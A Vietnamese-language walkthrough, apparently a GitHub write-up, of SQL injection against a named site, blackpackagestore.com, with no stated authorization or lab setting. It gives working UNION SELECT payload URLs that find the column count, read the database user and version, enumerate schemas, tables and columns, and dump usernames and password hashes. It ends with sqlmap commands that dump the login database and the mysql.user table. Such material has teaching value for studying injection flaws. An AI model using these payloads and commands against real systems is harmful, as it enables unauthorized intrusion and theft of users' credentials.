# TỔNG QUAN # 
Kiểm tra trên web "Black Package Store" `https://blackpackagestore.com/product.php?id=72`

![image](https://github.com/user-attachments/assets/df34c6d3-c54f-4b61-a8d8-c942b15b4122)

## CÁC BƯỚC

* [Dò tìm số cột](#dò-tìm-số-cột)
* [Kiểm tra database, version, user](#kiểm-tra-database-version-user)
* [Trích xuất cơ sở dữ liệu](#trích-xuất-cơ-sở-dữ-liệu)
* [Sử dụng `sqlmap`](#sử-dụng-sqlmap)

## Dò tìm số cột

![image](https://github.com/user-attachments/assets/fd126029-74d6-4b5d-843e-aa1ef90ca9bd)

![image](https://github.com/user-attachments/assets/1dae9e7c-ede6-497c-bd76-4927cd8affc5)

=> Số cột lớn hoen 1 và bé hơn 50

![image](https://github.com/user-attachments/assets/3d4a301c-ba81-467e-a6a6-8014fc79e6f1)

=> Số cột là 30  
## Kiểm tra database, version, user 

**1. User**

`https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,user(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30`

![image](https://github.com/user-attachments/assets/9fd803ab-520e-4c15-91c6-311e91b50589)

**2. Database**

`https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30`

![image](https://github.com/user-attachments/assets/ea00b3ed-b953-4291-bde2-d0e5f1020c4d)

**3. Version**

`https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,version(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30`

![image](https://github.com/user-attachments/assets/3bfea2e5-184f-46a7-960c-96dcc4c28024)

## Trích xuất cơ sở dữ liệu

**1. Liệt kê các database**

`https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,group_concat(0x7c,schema_name,0x7c),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+information_schema.schemata`

![image](https://github.com/user-attachments/assets/3632da54-d00c-4ccb-9c56-6ec40fa147c9)

**2. Liệt kê các bảng**

`https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,group_concat(0x7c,table_name,0x7C),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+information_schema.tables+where+table_schema='login'`

![image](https://github.com/user-attachments/assets/dd0d9791-c629-4116-a806-beaf2619fa81)

**3. Liệt kê các cột trong bảng**

`https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,group_concat(0x7c,column_name,0x7C),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+information_schema.columns+where+table_name='users'`

![image](https://github.com/user-attachments/assets/f9de200a-39dc-4de3-9c36-3aaf21127c14)

**4. Trích xuất dữ liệu bất kì**
`https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,user_name,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+users`

![image](https://github.com/user-attachments/assets/ae785d98-fb82-48b3-b93f-2db8573a8b2b)

`https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,user_password_hash,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+users`

![image](https://github.com/user-attachments/assets/21f2d6bf-6f0e-40b0-a00e-1d82d634f08e)

## Sử dụng `sqlmap`

**1. Trích xuất database:**

`sqlmap -u https://blackpackagestore.com/product.php?id=72 --dbs`

![image](https://github.com/user-attachments/assets/c5c25908-7213-447b-8c11-74e926545840)

**2. Tìm kiếm thông tin về username, password, tài khoản sysadmin**

`sqlmap -u https://blackpackagestore.com/product.php?id=72 -D login --tables`

![image](https://github.com/user-attachments/assets/2127b404-259e-417a-94e4-722aec4c55b3)

`sqlmap -u https://blackpackagestore.com/product.php?id=72 -D login -T users -C user_name --dump`

![image](https://github.com/user-attachments/assets/d9f17e4d-25ef-4890-ac4a-bf44a344b327)

sqlmap -u https://blackpackagestore.com/product.php?id=72 -D login -T users -C user_password_hash --dump`

![image](https://github.com/user-attachments/assets/fe22e570-f0ce-463b-a7e3-ea2bc8165b7f)

`sqlmap -u https://blackpackagestore.com/product.php?id=72 -D mysql --tables`

![image](https://github.com/user-attachments/assets/52a6f9ab-eb0d-4a26-9dcb-f3b508b81e3b)

`sqlmap -u https://blackpackagestore.com/product.php?id=72 -D mysql -T user --columns`

![image](https://github.com/user-attachments/assets/2054d2a2-1b16-4880-a56e-c776fda75c70)

![image](https://github.com/user-attachments/assets/0709a901-ee5c-47ef-95ad-a21e66f6de02)

`sqlmap -u https://blackpackagestore.com/product.php?id=72 -D mysql -T user -C Host,User,plugin --dump`

![image](https://github.com/user-attachments/assets/394ed735-6352-49a4-b918-61cc6fab1593)

